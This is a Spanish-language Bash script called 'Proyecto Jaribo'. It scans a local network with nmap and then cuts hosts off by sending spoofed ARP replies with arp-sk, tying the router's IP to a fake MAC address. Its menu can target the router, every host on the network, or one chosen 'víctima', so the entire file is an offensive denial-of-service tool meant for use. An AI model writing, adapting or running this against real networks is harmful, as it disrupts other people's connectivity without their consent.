#!/bin/bash
lineavacia=""
macvic=""

function configurador_inicial(){
	clear

	echo '  		     ___  ____  _____  _  __     '
	echo '  		    |   || __ || ___ \(_)|  |    '
	echo '  		    |   ||(__)|| |_/ / _ |  |__  ___   '
	echo '        	    |   || __ ||    / | ||  __ |/ _ \'
	echo '   		 __ /   || || || |\ \ | || (__)| (_) '
	echo '  	        |_______||_||_|\_| \_\|_||_____|\___/ '

	echo " |------------------------------------------------------------------------|"
	echo " |--------- Dime la dirección del router y la mascara de red -------------|"
	echo " |------------------------------------------------------------------------|"
	echo "-)    Puede que esta información de ayude a saber cual es la dirección    |"
	echo " |    `ifconfig | grep 'broadcast' | sed -e 's/^[ \t]*//'`"
	echo ""
	read red
	clear

	echo "+) Bienvenido al proyecto Jaribo un inhibidor de red a nivel local | v0.23("
	echo " )------------------------------------------------------------------------("
	echo " |---------------------- Dime el adaptador de red ------------------------|"
	echo ""
	read ether

	clear
}

configurador_inicial #Acceso a la funcion de arriba.

while [ true ]
do
echo " --------------------------------------------------------------------------"
echo " ) Bienvenido al proyecto Jaribo un inhibidor de red a nivel local | v0.23("
echo " |------------------------------------------------------------------------|"
echo " |--------> Consolas de supresión apuntando a '$red' desde '$ether'"
echo " |------------------------------------------------------------------------|"
echo " |- 0) Refrescar las conexiones.                                          |"
echo " |- 1) Mostrar a los JARIBOS.                                             |"
echo " |- 2) Inhibir toda la red.                                               |"
echo " |- 3) Vaciar red.                                                        |"
echo " |- 4) Inhibir un nodo específico.                                        |"
echo " |- 5) Reconfigurar red y adaptador.                                      |"
echo " |- 6) Muestra el valor de las variables.                                 |"
echo " |- 7) Salir.                                             Proyecto Jaribo |"
echo " )------------------------------------------------------------------------("

 #Genera variables a usando los datos itroducidos

router=`echo $red | cut -d "/" -f 1`

if [ -e Usuarios_en_red.txt ]; # revisa si Usuarios_en_red.txt existe
	then
		mrouter=`cat Usuarios_en_red.txt | cut -d " " -f 3 | awk NR==1`
	else
		echo "!)--> Atención, ¡ lista de usuarios no detectada !"
fi

read opt

clear

case $opt in #Empieza en case
0) #Actualiza la lista de Usuarios_en_Red

	echo "0)----------------------------ACTUALIZANDO LISTA--------------------------------("
	echo "|---  |  ---  |   ---  |  ---  _  ---  _  ---  _  ---   |  ---  |   ---  |   ---|"
	nmap -sP $red | grep "MAC" > Usuarios_en_red.txt #guarda las lineas de la salida del nmap que coinciden con la palara MAC
	echo "|    ---     ---      ---     LISTA ACTUALIZADA        ---     ---      ---     |"
	sleep 1
	echo "|---  |  ---  |   ---  |  ---  _  ---  _  ---  _  ---   |  ---  |   ---  |   ---|"
	echo "-)------------------------------------------------------------------------------("
	sleep 1
	clear
;;

1) #Muestra Uusarios_en_red

	echo "1)--------------------------- JARIBOS ------------------------------------("
	cat Usuarios_en_red.txt | nl -ba

;;

2) #Peta el router

	clear
	echo "2)--------------------- SUPRESIÓN SOBRE ROUTER ---------------------------("
	echo "/)---------------- ACCIONANDO CONSOLA  SOBRE '$mrouter' ---------("
	echo "-)------------------------------------------------------------------------("
	xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mrouter &
	read
	killall arp-sk
;;

3) #Peta toda la red menos tu y el router - DE MOMENTO NO FUNSIONA

	echo "3)----------------- SUPRESIÓN MASIVA EN EJECUCIÓN ------------------------("
	echo "-)----- SUPRESIÓN MASIVA DETECTADA, ACCIONANDO CONSOLAS SECUNDARIAS ------("
	echo "-)------------------------------------------------------------------------("
	for mac in `cat Usuarios_en_red.txt | grep "MAC" | cut -d " " -f 3`;
	do
		if [ "$mac" != "$mrouter" ];
			then
			xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mac & PIDE=$!
			echo "⌬ > EJECUTANDO CONSOLA $PIDE > ACCIONANDO SUPRESIÓN SOBRE $mac"
		fi
	done
	echo "-)------------------------------------------------------------------------("
	read
	killall arp-sk
;;

4) #Peta jaribo especifico

	clear
	echo "-)------------------------------------------------------------------------("
	cat Usuarios_en_red.txt | nl -ba
	echo "-)------------------------------------------------------------------------("
	echo "2)  Seleccione a la víctima, presione -Intro-  para salir del modulo   ---("
	read macvic
	clear
	if [ -n "$macvic" ];  #si apreta intro vuelve al menú
		then
			echo "+) Filtrando mac de la victima..."
			mac=`cat Usuarios_en_red.txt | cut -d " " -f 3 |awk NR==$macvic`
			echo "-) Apuntando a --> '$mac' "
			echo "/)---------------- ACCIONANDO CONSOLA  SOBRE '$mac' ---------("
			echo "-)------------------------------------------------------------------------("
			xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mac &
			read
			killall arp-sk
			macvic=""
	fi
;;

5) # llama a la funcion de reconfiguración

	clear
	configurador_inicial
;;

-) # Actualmente desabilitado

echo " |-----> "
echo " |------------------------------------------------------------------------|"
echo " |- 1)                                                                    |"
echo " |- 2)                                                                    |"
echo " |------------------------------------------------------------------------|"


;;

6) # Muestra los valores de las variables, se usa para identificar problemas de configuración u programación

	echo "| red     = '$red' --> Se usa para identificar la red y la ip del router"
	echo "| ether   = '$ether' --> Se usa para identificar el adaptador de salida"
	echo "| router  = '$router' --> Se usa para identificar la ip del Router"
	echo "| mrouter = '$mrouter' --> Se usa para identificar la mac del router"
	echo "| ownmac  = '$ownmac' --> Se usa para idenfiticar la mac del cliente"
	echo "| mac     = '$mac' --> Se usa para identificar la mac de la victima"
	echo ""
;;

7)
 exit
;;

esac #final del case
done #final del bucle
